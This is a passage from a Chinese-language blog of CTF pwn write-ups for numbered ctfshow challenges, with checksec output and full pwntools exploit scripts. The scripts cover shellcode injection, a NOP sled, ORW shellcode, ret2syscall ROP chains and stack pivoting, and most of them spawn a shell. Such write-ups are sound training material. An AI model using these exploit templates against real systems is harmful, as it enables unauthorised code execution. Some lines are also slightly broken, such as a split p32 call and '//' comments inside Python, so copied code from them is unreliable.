class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="54-puts遇见’-x00’截断，可以填充满导致后续内容溢出"><a href="#54-puts遇见’-x00’截断，可以填充满导致后续内容溢出" class="headerlink" title="54 puts遇见’\x00’截断，可以填充满导致后续内容溢出"></a>54 puts遇见’\x00’截断，可以填充满导致后续内容溢出</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28241</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Username:\n&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">256</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;aa,&#x27;</span>)</span><br><span class="line">password = p.recv(<span class="number">33</span>)</span><br><span class="line">p.close()</span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28241</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;amdin&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;.\n&#x27;</span>,password)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="61-leave-ret指令会对shellcode产生影响，注意输入的后面是否有该指令"><a href="#61-leave-ret指令会对shellcode产生影响，注意输入的后面是否有该指令" class="headerlink" title="61 leave_ret指令会对shellcode产生影响，注意输入的后面是否有该指令"></a>61 leave_ret指令会对shellcode产生影响，注意输入的后面是否有该指令</h2><h4 id="有PIE，栈可执行，有RWX"><a href="#有PIE，栈可执行，有RWX" class="headerlink" title="有PIE，栈可执行，有RWX"></a>有PIE，栈可执行，有RWX</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">❯ checksec pwn</span><br><span class="line">[*] &#x27;/home/pwn/pwn/ctfshow/61/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p =remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28273</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;[&#x27;</span>)</span><br><span class="line">v5 = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;]&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(v5+<span class="number">0x20</span>)+shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;cat ctfshow_flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="66-x00绕过字符串"><a href="#66-x00绕过字符串" class="headerlink" title="66 \x00绕过字符串"></a>66 \x00绕过字符串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00\xc0&#x27;</span>+asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="68-nop-sled-64bit"><a href="#68-nop-sled-64bit" class="headerlink" title="68 nop sled(64bit)"></a>68 nop sled(64bit)</h2><h4 id="有Canary，无PIE，栈可执行，有RWX-绕过随机数生成的缓冲区位置"><a href="#有Canary，无PIE，栈可执行，有RWX-绕过随机数生成的缓冲区位置" class="headerlink" title="有Canary，无PIE，栈可执行，有RWX,绕过随机数生成的缓冲区位置"></a>有Canary，无PIE，栈可执行，有RWX,绕过随机数生成的缓冲区位置</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">❯ checksec pwn</span><br><span class="line">[*] &#x27;/home/pwn/pwn/ctfshow/68/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28182</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">1336</span> + shellcode</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;: 0x&quot;</span>)</span><br><span class="line">addr = u64(unhex(p.recvline(keepends=<span class="literal">False</span>).zfill(<span class="number">16</span>)),endian=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;addr:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">sh = addr + <span class="number">668</span> + <span class="number">0x35</span></span><br><span class="line">log.info(<span class="string">&quot;send:&quot;</span>+<span class="built_in">hex</span>(sh))</span><br><span class="line">p.sendline(<span class="built_in">hex</span>(sh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="69-ORW的板子"><a href="#69-ORW的板子" class="headerlink" title="69 ORW的板子"></a>69 ORW的板子</h2><h4 id="无Canary，无PIE，有RWX，栈可执行"><a href="#无Canary，无PIE，有RWX，栈可执行" class="headerlink" title="无Canary，无PIE，有RWX，栈可执行"></a>无Canary，无PIE，有RWX，栈可执行</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">❯ checksec pwn</span><br><span class="line">[*] &#x27;/home/pwn/pwn/ctfshow/69/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28170</span>)</span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">jmp_rsp = <span class="number">0x400a01</span></span><br><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/ctfshow_flag&quot;</span>) <span class="comment"># 打开根目录下的ctfshow_flag文件</span></span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">100</span>) <span class="comment"># 读取文件标识符是3的文件0x100个字节存放到mmap分配的地址空间里</span></span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">100</span>) <span class="comment"># 将mmap地址上的内容输出0x100个字节</span></span><br><span class="line">shellcode = asm(orw_shellcode)</span><br><span class="line"><span class="comment">## read里的fd写3是因为程序执行的时候文件描述符是从3开始的，write里的1是标准输出到显示器</span></span><br><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+asm(<span class="string">&quot;mov rax,0x123000; jmp rax&quot;</span>)</span><br><span class="line"><span class="comment"># buf里的rop是往mmap里读入0x100长度的数据，跳转到mmap的地址执行</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># buf的大小是0x20，加上rbp 0x8是0x28，用&#x27;\x00&#x27;去填充剩下的位置</span></span><br><span class="line">payload += p64(jmp_rsp)+asm(<span class="string">&quot;sub rsp,0x30; jmp rsp&quot;</span>) <span class="comment"># 返回地址写上跳转到rsp</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;do&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="70-ORW的汇编板子"><a href="#70-ORW的汇编板子" class="headerlink" title="70 ORW的汇编板子"></a>70 ORW的汇编板子</h2><h4 id="有Canary，无PIE，栈可执行，有RWX，沙盒保护"><a href="#有Canary，无PIE，栈可执行，有RWX，沙盒保护" class="headerlink" title="有Canary，无PIE，栈可执行，有RWX，沙盒保护"></a>有Canary，无PIE，栈可执行，有RWX，沙盒保护</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">❯ checksec pwn</span><br><span class="line">[*] &#x27;/home/pwn/pwn/ctfshow/70/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28156</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov r15, 0x67616c66	//flag的ascll码形式</span></span><br><span class="line"><span class="string">push r15</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">mov rsi, 0</span></span><br><span class="line"><span class="string">mov rax, 2</span></span><br><span class="line"><span class="string">syscall		//open(&quot;flag&quot;,rsp,0)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov r14, 3</span></span><br><span class="line"><span class="string">mov rdi, r14</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov rdx, 0xff</span></span><br><span class="line"><span class="string">mov rax, 0</span></span><br><span class="line"><span class="string">syscall		//read(3,rsp,0xff)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov rdx, 0xff</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">syscall		//write(1.rsp,oxff)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = asm(shellcode)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="71-ret2syscall-32bit-板子"><a href="#71-ret2syscall-32bit-板子" class="headerlink" title="71 ret2syscall(32bit)板子"></a>71 ret2syscall(32bit)板子</h2><h4 id="NX开启，无PIE"><a href="#NX开启，无PIE" class="headerlink" title="NX开启，无PIE"></a>NX开启，无PIE</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">❯ checksec pwn</span><br><span class="line">[*] &#x27;/home/pwn/pwn/ctfshow/71/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28304</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x80BE408</span>	//能找到binsh</span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">pop_eax = <span class="number">0x080bb196</span>	//控制<span class="built_in">int</span> <span class="number">0x80</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806eb90</span>	//传<span class="number">3</span>个参数</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x6C</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload+=p32(pop_eax)+p32(<span class="number">0xb</span>)	//<span class="number">0xb</span>是execve</span><br><span class="line">payload+=p32(pop_edx_ecx_ebx)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(binsh)	//execve(<span class="number">0</span>,<span class="number">0</span>,<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">payload+=p32(int_0x80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="72-ret2syscall-32bit-无-bin-sh-板子"><a href="#72-ret2syscall-32bit-无-bin-sh-板子" class="headerlink" title="72 ret2syscall(32bit,无&#x2F;bin&#x2F;sh)板子"></a>72 ret2syscall(32bit,无&#x2F;bin&#x2F;sh)板子</h2><h4 id="NX保护开启，无PIE"><a href="#NX保护开启，无PIE" class="headerlink" title="NX保护开启，无PIE"></a>NX保护开启，无PIE</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">❯ checksec pwn</span><br><span class="line">[*] &#x27;/home/pwn/pwn/ctfshow/72/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28258</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x080bb2c6</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">int_0x80 = <span class="number">0x0806f350</span></span><br><span class="line"><span class="comment">#------read-----</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806ecb0</span></span><br><span class="line">bss = <span class="number">0x80EB000</span></span><br><span class="line">payload+=p32(pop_eax)+p32(<span class="number">0x3</span>)</span><br><span class="line">payload+=p32(pop_edx_ecx_ebx)+p32(<span class="number">0x10</span>)+p32(bss)+p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(int_0x80)</span><br><span class="line"><span class="comment">#------syscall-------</span></span><br><span class="line">payload+=p32(pop_eax)+p32(<span class="number">0xb</span>)</span><br><span class="line">payload+=p32(pop_edx_ecx_ebx)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bss)</span><br><span class="line">payload+=p32(int_0x80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="75-栈迁移（32位）"><a href="#75-栈迁移（32位）" class="headerlink" title="75 栈迁移（32位）"></a>75 栈迁移（32位）</h2><h4 id="可以泄露ebp"><a href="#可以泄露ebp" class="headerlink" title="可以泄露ebp"></a>可以泄露ebp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28143)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave = <span class="number">0x080484d5</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x24</span>+<span class="string">b&#x27;show&#x27;</span></span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;codename:\n&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;show&#x27;</span>)</span><br><span class="line">ebp = u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">buf = ebp-<span class="number">0x38</span></span><br><span class="line">payload = (p32(system)+p32(<span class="number">0</span>)+p32(buf+<span class="number">12</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(buf-<span class="number">4</span>)+p3</span><br><span class="line"><span class="number">2</span>(leave)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

